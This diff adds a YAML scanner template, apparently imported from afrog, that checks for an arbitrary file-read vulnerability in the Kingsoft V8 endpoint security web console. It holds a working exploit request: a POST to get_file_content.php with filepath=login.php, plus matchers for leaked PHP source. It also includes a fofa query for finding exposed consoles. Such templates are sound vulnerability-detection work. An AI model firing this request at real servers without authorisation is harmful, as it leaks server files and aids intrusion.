@@ -1,0 +1,31 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - body: filepath=login.php
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - <?php
+          - '"public/common.php"'
+          - HTTP_ACCEPT_LANGUAGE
+        condition: and
+    method: POST
+    path:
+      - '{{BaseURL}}/receive_file/get_file_content.php'
+id: kingsoft-v8-get-file-content-file-read
+info:
+  author: zan8in
+  description: |-
+    金山 V8 终端安全系统 存在任意文件读取漏洞，攻击者可以通过漏洞下载服务器任意文件
+    fofa: title="在线安装-V8+终端安全系统Web控制台"
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: 金山 V8 终端安全系统 get_file_content.php 任意文件读取漏洞
+  severity: high
+  tags: kingsoft,file-read,argus-import
